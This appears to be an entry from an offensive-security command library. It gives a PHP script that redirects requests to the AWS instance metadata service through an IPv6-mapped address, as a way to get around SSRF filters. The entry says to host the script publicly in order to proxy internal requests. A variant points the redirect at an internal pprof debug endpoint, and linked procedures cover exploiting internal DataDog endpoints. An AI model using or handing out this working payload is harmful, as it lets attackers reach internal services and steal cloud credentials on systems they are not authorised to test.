---
id: cmd-php-redirect-ipv6
data: >-
  <?php // Set CORS headers header("Access-Control-Allow-Origin: *");
  header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
  header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type,
  Accept"); header("Content-Type: application/json"); header("Location:
  http://[::ffff:a9fe:a9fe]"); //IPv6 Compressed ?>
tags:
  - ssrf
  - redirect
  - php
type: command
output: HTTP 302 redirect to IPv6-mapped endpoint
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.471Z'
verified: false
validated: true
submitted: true
---
# php-redirect-to-ipv6-aws-metadata

## Command

```php
<?php
// Set CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
header("Content-Type: application/json");
header("Location: http://[::ffff:a9fe:a9fe]"); //IPv6 Compressed mapping to 169.254.169.254
?>
```

## Description

This PHP script is executed on a web server to handle incoming requests from a webhook. It sets permissive CORS and JSON headers, then redirects to an IPv6-mapped IPv4 address for the AWS metadata service, enabling SSRF bypass. Use this in public hosting to proxy internal requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location header | Target URL for redirect (e.g., http://[::ffff:a9fe:a9fe]) | Yes |
| Access-Control-Allow-Origin | CORS origin policy (*) | Yes |

## Examples

### Basic Usage

Save as `h1.php` and host publicly. When requested via GET, it redirects.

```php
// As shown in command
```

### Advanced Usage

Modify Location for other endpoints:

```php
header("Location: http://[::ffff:7f00:1]:5000/debug/pprof/heap?debug=1");
```

## Expected Output

HTTP response with 302 status, Location header pointing to the internal endpoint, and CORS/JSON headers. When triggered by SSRF, logs show internal service responses like `server: EC2ws`.

## Related

- [[procedures/Host-PHP-Redirect-Script-for-SSRF]]
- [[procedures/Exploit-Internal-DataDog-Endpoints-via-SSRF]]
